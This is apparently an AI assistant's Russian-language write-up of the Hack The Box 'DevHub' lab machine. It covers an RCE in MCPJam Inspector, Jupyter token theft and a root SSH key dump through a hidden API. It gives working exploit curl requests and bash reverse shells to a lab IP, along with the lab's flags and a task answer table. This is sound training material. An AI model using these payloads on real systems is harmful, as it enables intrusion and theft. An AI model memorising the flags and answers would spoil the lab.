Отлично! Вот структурированный **Write-Up** по машине DevHub (HTB). Можете использовать его как есть или адаптировать под свой формат.

---

# DevHub — Hack The Box Write-Up

| Параметр | Значение |
| :--- | :--- |
| **Машина** | DevHub |
| **Платформа** | Hack The Box |
| **ОС** | Linux (Ubuntu 22.04.5 LTS) |
| **Сложность** | Medium |
| **IP** | 10.129.245.216 |
| **User Flag** | `42510d6fe93c34aff92e1e36144fbec8` |
| **Root Flag** | `8954813cd1a575a349defba317bc1bd9` |

---

## 1. Разведка (Reconnaissance)

### 1.1 Nmap

```bash
nmap -sC -sV -oA nmap/devhub 10.129.245.216
```

**Результат:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
```

**Вывод:** открыто 2 TCP-порта. HTTP редиректит на `devhub.htb` — добавляем в `/etc/hosts`:

```bash
echo "10.129.245.216 devhub.htb" | sudo tee -a /etc/hosts
```

### 1.2 Веб-перечисление

```bash
gobuster dir -u http://devhub.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Находим приложение **MCPJam Inspector** на порту **6274** (упоминается в JS/HTML или обнаруживается сканированием портов):

```bash
nmap -p 6274 -sV devhub.htb
```

---

## 2. Первоначальный доступ (Foothold)

### 2.1 CVE-2026-23744 — MCPJam Inspector RCE

**Уязвимость:** MCPJam Inspector ≤ 1.4.2 содержит RCE без аутентификации через эндпоинт `POST /api/mcp/connect`. Поля `command` и `args` передаются в системный вызов без санитизации.

**PoC:** [github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC](https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC)

**Эксплуатация вручную:**

```bash
# Слушатель
nc -lvnp 4444

# Отправка полезной нагрузки
curl -X POST "http://devhub.htb:6274/api/mcp/connect" \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.215/4444 0>&1"],"env":{}},"serverId":"mytest"}'
```

**Результат:** реверс-шелл от пользователя **`mcp-dev`**.

```
mcp-dev@devhub:/$ id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

### 2.2 Стабилизация доступа

```bash
# На Kali
ssh-keygen -t ed25519 -f devhub -N ""
cat devhub.pub

# На DevHub (в шелле mcp-dev)
mkdir -p ~/.ssh
echo "ssh-ed25519 AAAA... SSH to svcweb" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Подключение
ssh -i devhub mcp-dev@devhub.htb
```

---

## 3. Перечисление и переход к analyst

### 3.1 Поиск Jupyter Notebook

```bash
ps aux | grep -i jupyter
```

**Результат:**

```
analyst 1082 1 0 11:20 ? 00:00:05 /home/analyst/jupyter-env/bin/python3 \
  /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 \
  --no-browser --notebook-dir=/home/analyst/notebooks \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 \
  --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
```

**Токен:** `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`

### 3.2 Проброс порта и RCE через Jupyter

```bash
# Туннель
ssh -i devhub -N -L 8888:127.0.0.1:8888 mcp-dev@devhub.htb
```

Открываем `http://127.0.0.1:8888/?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`, создаём Notebook:

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.215/4445 0>&1'")
```

**Результат:** шелл от **`analyst`**.

```bash
cat /home/analyst/user.txt
# 42510d6fe93c34aff92e1e36144fbec8
```

---

## 4. Повышение привилегий (Privilege Escalation)

### 4.1 Поиск API-ключа OPSMCP

```bash
ls -la /home/analyst/
# ...
# -rw------- 1 analyst analyst 35 Mar 16 2026 .opsmcp_key
```

```bash
cat /home/analyst/.opsmcp_key
# opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

### 4.2 Перечисление инструментов OPSMCP

```bash
API_KEY=$(cat /home/analyst/.opsmcp_key)
curl -s -H "X-API-Key: $API_KEY" http://127.0.0.1:5000/tools/list
```

**Видимые инструменты:** `ops.system_status`, `ops.list_services`, `ops.check_disk`, `ops.view_logs`.

### 4.3 Скрытые обработчики

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._debug_mode", "arguments": {"enabled": true}}'
```

**Результат:** раскрыты скрытые обработчики, включая **`ops._admin_dump`**.

### 4.4 Дамп SSH-ключа root

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}' \
  -o dump.json

jq -r '.root_private_key' dump.json > root_key
chmod 600 root_key
```

### 4.5 Вход как root

```bash
ssh -i root_key root@devhub.htb
cat /root/root.txt
# 8954813cd1a575a349defba317bc1bd9
```

---

## 5. Итоговая цепочка

```
Nmap (22, 80)
  └─> devhub.htb + MCPJam Inspector :6274
        └─> CVE-2026-23744 (RCE через /api/mcp/connect, поле command)
              └─> шелл mcp-dev
                    └─> ps aux → токен Jupyter (analyst)
                          └─> Jupyter RCE → шелл analyst → user.txt
                                └─> ~/.opsmcp_key
                                      └─> OPSMCP API :5000 → /tools/list
                                            └─> ops._debug_mode → скрытые обработчики
                                                  └─> ops._admin_dump (target=ssh_keys)
                                                        └─> SSH-ключ root → root.txt
```

---

## 6. Ответы на задачи

| Task | Ответ |
| :--- | :--- |
| 1 | 2 TCP-порта (22, 80) |
| 2 | CVE-2026-23744 |
| 3 | `/api/mcp/connect` |
| 4 | `command` |
| 5 | `analyst` |
| 6 | `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` |
| 8 | `.opsmcp_key` |
| 9 | `/tools/list` |
| 10 | `ops._debug_mode` |
| 11 | `ops._admin_dump` |

---

## 7. Рекомендации по устранению

| Уязвимость | Мера |
| :--- | :--- |
| CVE-2026-23744 (RCE) | Обновить MCPJam Inspector до 1.4.3+; ограничить доступ к порту 6274 |
| Токен Jupyter в `ps aux` | Передавать токен через конфиг-файл или переменную окружения, а не аргумент CLI |
| API-ключ в открытом виде | Хранить в защищённом хранилище (Vault, secrets manager) |
| Скрытые эндпоинты | Убрать отладочные функции из production; ввести RBAC |
| Сервис от root с дампом файлов | Запускать OPSMCP от непривилегированного пользователя |

---

## 8. Выводы

DevHub — классическая **medium-машина** с цепочкой из нескольких уязвимостей:

1. **RCE в MCPJam Inspector** даёт первый шелл.
2. **Небрежное обращение с секретами** (токен в CLI, ключ в домашней директории) позволяет двигаться латерально.
3. **Скрытые отладочные функции** в сервисе, работающем от root, приводят к полному захвату.

Ключевой урок: **безопасность — это цепочка, и слабое звено ломает всю защиту**.

---

Если хотите, могу:
- Оформить в **Markdown-файл** для GitHub.
- Сделать версию **на английском**.
- Добавить **скриншоты** (описания, что снимать).
- Сократить до **краткого варианта** (TL;DR).

Что нужно?
